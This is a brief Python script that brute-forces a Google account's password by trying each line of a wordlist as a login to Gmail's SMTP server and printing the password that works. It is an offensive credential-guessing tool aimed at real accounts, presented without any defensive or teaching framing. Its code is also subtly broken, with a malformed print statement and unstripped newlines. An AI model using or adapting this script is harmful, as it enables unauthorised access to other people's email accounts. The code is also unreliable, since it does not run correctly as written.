#!/bin/python3
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

account = input("Enter google account: ")
passwdfile = input("Enter password lists // Directory: \n")

passwdfile = open(passwdfile, "r")

for password in passwdfile:
    try:
        smtpserver.login(account, password)

        print("Password found:"%s) % (password)
        break

    except smtplib.SMTPAuthenticationError:
        print("Trying password: Failed")
